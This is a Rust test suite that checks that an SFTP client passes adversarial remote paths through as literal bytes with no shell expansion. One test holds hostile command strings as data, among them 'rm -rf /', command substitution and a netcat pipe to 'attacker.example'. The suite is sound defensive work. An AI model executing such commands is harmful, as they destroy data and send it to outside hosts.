//! t8-A6 path/CLI-injection sanity tests for `SftpClient`.
//!
//! ## Why this suite is narrow
//!
//! The brief asked for "shell metachar / newline / backslash / quote in
//! remote path escaped before reaching the wire". The actual `SftpClient`
//! has no shell — it wraps `russh_sftp::SftpSession`, which is a binary
//! protocol (RFC 6041 SFTP wire format). Paths travel as length-prefixed
//! UTF-8 byte strings; there is no quoting or shell-out step where
//! injection could happen.
//!
//! What we DO test:
//!   * NUL bytes in paths are surfaced as protocol errors (`russh_sftp`
//!     rejects or the backend NoSuchFile-s them).
//!   * CR/LF in paths are passed through opaquely (not shell-injected).
//!   * Backslashes / quotes / dollar-signs are treated as literal path
//!     characters (no expansion).
//!
//! These tests pin the *non-vulnerability* by demonstrating the binary
//! protocol's opaque handling of adversarial bytes.

#![cfg(feature = "testing")]
#![allow(clippy::missing_panics_doc)]

use spt_sftp::mock::MockSftpServer;

async fn setup() -> (tempfile::TempDir, MockSftpServer, spt_sftp::SftpClient) {
    let dir = tempfile::tempdir().unwrap();
    let (server, client) = MockSftpServer::start(dir.path()).await;
    (dir, server, client)
}

#[tokio::test]
async fn shell_metachar_in_path_treated_as_literal() {
    let (dir, _server, client) = setup().await;

    // Positive control: prove `try_exists` actually reports presence, so the
    // `Ok(false)` assertions below are meaningful (not vacuously always-false).
    std::fs::write(dir.path().join("real.txt"), b"x").unwrap();
    assert!(
        client.try_exists("/real.txt").await.unwrap(),
        "control: a real file must be reported present"
    );

    // None of these are interpreted as shell metacharacters because the SFTP
    // wire format doesn't tokenise: each is a literal path the backend either
    // reports absent (`Ok(false)`) or rejects at the filesystem layer (`Err`,
    // e.g. Windows disallows `|`/`"` in names). What it must NEVER do is claim
    // the path is present, and it must never shell-expand into a host effect.
    let paths = [
        "/nope; rm -rf /",
        "/nope && touch /tmp/evil",
        "/nope | nc attacker.example 9999",
        "/nope `whoami`",
        "/nope $(id)",
    ];
    for p in paths {
        let res = client.try_exists(p).await;
        assert!(
            !matches!(res, Ok(true)),
            "adversarial path `{p}` must not be reported present (no shell expansion): {res:?}"
        );
    }

    // No side-effect appeared on the host from any metachar path: the only
    // entry under the served root is the control file we created.
    let entries: Vec<_> = std::fs::read_dir(dir.path())
        .unwrap()
        .map(|e| e.unwrap().file_name())
        .collect();
    assert_eq!(entries, [std::ffi::OsString::from("real.txt")]);
}

#[tokio::test]
async fn newline_in_remote_path_handled_opaquely() {
    let (_dir, _server, client) = setup().await;
    // A path containing LF or CR must be a single literal path component, not
    // a command separator. It is never reported present (it is absent, or the
    // OS rejects the control bytes in a filename with an error).
    assert!(!matches!(client.try_exists("/foo\nbar").await, Ok(true)));
    assert!(!matches!(client.try_exists("/foo\r\nbar").await, Ok(true)));
}

#[tokio::test]
async fn backslash_in_remote_path_is_a_literal_char() {
    let (dir, _server, client) = setup().await;
    // Backslash is a literal filename char on Unix and a separator on Windows;
    // either way the path is not present and nothing is created for it.
    let p = "/back\\slash";
    assert!(!matches!(client.try_exists(p).await, Ok(true)));
    // Sanity: nothing got created under a Windows-style split path.
    assert!(!dir.path().join("back").exists());
}

#[tokio::test]
async fn quote_in_remote_path_is_a_literal_char() {
    let (_dir, _server, client) = setup().await;
    for p in ["/single'quote", "/double\"quote", "/back`tick"] {
        let res = client.try_exists(p).await;
        assert!(
            !matches!(res, Ok(true)),
            "quote path `{p}` must never be reported present: {res:?}"
        );
    }
}

#[tokio::test]
async fn null_byte_in_path_rejected_or_truncated_safely() {
    let (dir, _server, client) = setup().await;
    // SFTP paths are length-prefixed UTF-8; a NUL is a valid wire byte but the
    // filesystem rejects interior NULs. The requirement: the path is NEVER
    // reported present, and no host file materialises from it (no escape).
    let res = client.try_exists("/file\0name").await;
    assert!(
        !matches!(res, Ok(true)),
        "NUL-containing path must never be reported present, got {res:?}"
    );
    assert!(!dir.path().join("file").exists());
}

#[tokio::test]
async fn dotdot_in_path_collapsed_by_canonicalize() {
    let (dir, _server, client) = setup().await;
    std::fs::write(dir.path().join("real.txt"), b"x").unwrap();
    // Server's canonicalize folds `..` segments per the SFTP semantics.
    let res = client.canonicalize("/foo/../real.txt").await;
    assert!(res.is_ok(), "canonicalize should normalize: {res:?}");
    let canon = res.unwrap();
    assert!(
        canon.ends_with("/real.txt") || canon.ends_with("real.txt"),
        "expected canonical path, got `{canon}`"
    );
}
